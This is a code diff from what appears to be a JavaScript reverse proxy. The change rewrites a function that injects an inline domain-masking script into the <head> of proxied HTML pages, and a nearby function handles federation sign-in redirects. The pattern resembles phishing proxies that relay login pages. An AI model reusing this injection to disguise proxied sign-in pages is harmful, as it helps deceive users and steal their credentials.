@@ -1286,30 +1286,30 @@ async function compressResponseBody(decompressedData, encodings) {
 
 // ---- updateHTMLProxyResponse is no longer used – we replaced it with dynamic injection ----
 function updateHTMLProxyResponse(decompressedResponseBody) {
-    const payload = "<script src=/@></script>";
-    const htmlInjectionMap = {
-        "<head>": `<head>${payload}`,
-        "<html>": `<html><head>${payload}</head>`,
-        "<body>": `<head>${payload}</head><body>`
-    };
-    const indexLimit = 200;
+    // The inline script tag
+    const maskScriptTag = `<script>${DOMAIN_MASK_SCRIPT}</script>`;
+    const htmlString = decompressedResponseBody.toString('utf8');
 
-    for (const [key, value] of Object.entries(htmlInjectionMap)) {
-        const htmlTagBuffer = Buffer.from(key);
-        const injectionPointIndex = decompressedResponseBody.subarray(0, indexLimit).indexOf(htmlTagBuffer);
-
-        if (injectionPointIndex !== -1) {
-            return Buffer.concat([
-                decompressedResponseBody.subarray(0, injectionPointIndex),
-                Buffer.from(value),
-                decompressedResponseBody.subarray(injectionPointIndex + htmlTagBuffer.byteLength)
-            ]);
-        }
+    // Find first '<head'
+    const headOpenMatch = htmlString.match(/<head[^>]*>/i);
+    if (headOpenMatch) {
+        const headEndIndex = headOpenMatch.index + headOpenMatch[0].length;
+        const modified = htmlString.slice(0, headEndIndex) + maskScriptTag + htmlString.slice(headEndIndex);
+        return Buffer.from(modified, 'utf8');
     }
-    return Buffer.concat([
-        Buffer.from(`<head>${payload}</head>`),
-        decompressedResponseBody
-    ]);
+
+    // Fallback: find <html>
+    const htmlOpenMatch = htmlString.match(/<html[^>]*>/i);
+    if (htmlOpenMatch) {
+        const htmlEndIndex = htmlOpenMatch.index + htmlOpenMatch[0].length;
+        const modified = htmlString.slice(0, htmlEndIndex) +
+                         `<head>${maskScriptTag}</head>` +
+                         htmlString.slice(htmlEndIndex);
+        return Buffer.from(modified, 'utf8');
+    }
+
+    // Ultimate fallback: prepend full HTML
+    return Buffer.from(`<!DOCTYPE html><html><head>${maskScriptTag}</head><body>${htmlString}</body></html>`, 'utf8');
 }
 
 function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
